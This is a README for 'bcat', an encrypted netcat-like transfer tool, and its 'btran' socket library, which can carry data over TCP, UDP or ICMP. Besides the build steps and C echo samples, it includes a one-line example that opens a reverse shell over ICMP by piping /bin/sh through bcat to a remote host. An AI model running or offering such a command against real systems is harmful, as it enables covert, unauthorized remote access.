# bcat

bcat is a small utility that allows to reliably and securely exchange data between a server and a client.

It is designed to be used as easily as netcat.

Features:
- The communication between the two entities is encrypted with a shared simmetric key (it uses `salsa20`)
- It supports multiple transport protocols (as of today `tcp`, `udp` and `icmp`)
- It supports connection handling and packet retransmission for unreliable transport protocols

The real magic is implemented in the `btran` library, that exposes posix-like socket wrappers for multiple transport protocols.
More on that at the end of this readme.

## Compilation

You can compile `bcat` utility and `btran` library using cmake;

```
mkdir build
cd build
cmake ..
make
```

## Usage

```
USAGE: ./bcat [-l] [-P <protocol>] [-K <key>] [-v] [-h] <addr> <port>

    -h: print help
    -l: listen mode
    -K: key, required if not in listen mode
    -P: backend protocol type [tcp, udp, icmp]
    -k: keep the connection alive
    -v: verbose
```

### Examples

Exchange a file using `TCP`:

``` bash
# listen side
bcat -K super_secret_key -l -P tcp *bindIp* *bindPort* > /path/to/output/file

# connect side
bcat -K super_secret_key -P tcp *connectIp* *connectPort* < /path/to/input/file
```

Exchange a file using `ICMP`:

``` bash
# listen side
sudo bcat -K super_secret_key -l -P icmp *bindIp* *bindPort* > /path/to/output/file

# connect side
sudo bcat -K super_secret_key -P icmp *connectIp* *connectPort* < /path/to/input/file
```

Open a reverse shell using `ICMP`:

``` bash
# listen side
sudo bcat -K super_secret_key -l -P icmp *bindIp* *bindPort* > /path/to/output/file

# connect side
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | ./bcat -K super_secret_key -P icmp *connectIp* *connectPort* > /tmp/f
```

# btran

The btran library exposes posix-like socket primitives for different backend transport protocols.
As of today, it supports `tcp`, `udp` and `icmp`.

Features:
- It transparently handles authentication and encryption using a pre-shared symmetric key (it uses [salsa20](https://github.com/AlexWebr/salsa20)).
- For `udp` and `icmp`, it transparently handles connection handling (look at [reldgram](btran/reldgram.c)) and packet retransmission (under the hood, it uses [kmp](https://github.com/skywind3000/kcp)).

## Usage

Look at [btran.h](btran/btran.h) to view its public APIs.

### Examples

Sample echo server that uses ICMP as transport protocol:

``` C
#include <stdio.h>
#include <btran.h>

int main() {
    btran_ctx_t ctx;
    if (btran_init(&ctx, BTRAN_ICMP, "encryptionKey") != 0)
        return 1;

    if (btran_listen(&ctx, "0.0.0.0", 1337) != 0) {
        printf("[!] unable to conenct, maybe you are not root?\n");
        btran_dispose(&ctx);
        return 1;
    }

    while (1) {
        btran_ctx_t client;
        if (btran_accept(&ctx, &client) != 0)
            continue;

        uint8_t* buf;
        uint32_t buf_size;
        if (btran_recv(&client, &buf, &buf_size, 0) != 0) {
            btran_dispose(&client);
            continue;
        }
        printf("[+] received: %.*s\n", (char*)buf_size, buf);

        btran_send(&client, buf, buf_size);
        btran_dispose(&client);
        free(buf);
    }
    return 0;
}
```

Sample echo client

``` C
#include <stdio.h>
#include <btran.h>

int main() {
    btran_ctx_t ctx;
    if (btran_init(&ctx, BTRAN_ICMP, "encryptionKey") != 0)
        return 1;

    if (btran_connect(&ctx, "127.0.0.1", 1337) != 0) {
        printf("[!] unable to conenct, maybe you are not root?\n");
        btran_dispose(&ctx);
        return 1;
    }

    const char* data = "Hello";
    if (btran_send(&ctx, (uint8_t*)data, 5) != 0) {
        btran_dispose(&ctx);
        return 1;
    }

    uint8_t* buf;
    uint32_t buf_size;
    if (btran_recv(&ctx, &buf, &buf_size, 0) != 0) {
        btran_dispose(&ctx);
        return 1;
    }
    printf("[+] received: %.*s\n", (char*)buf_size, buf);

    free(buf);
    btran_dispose(&ctx);
    return 0;
}
```
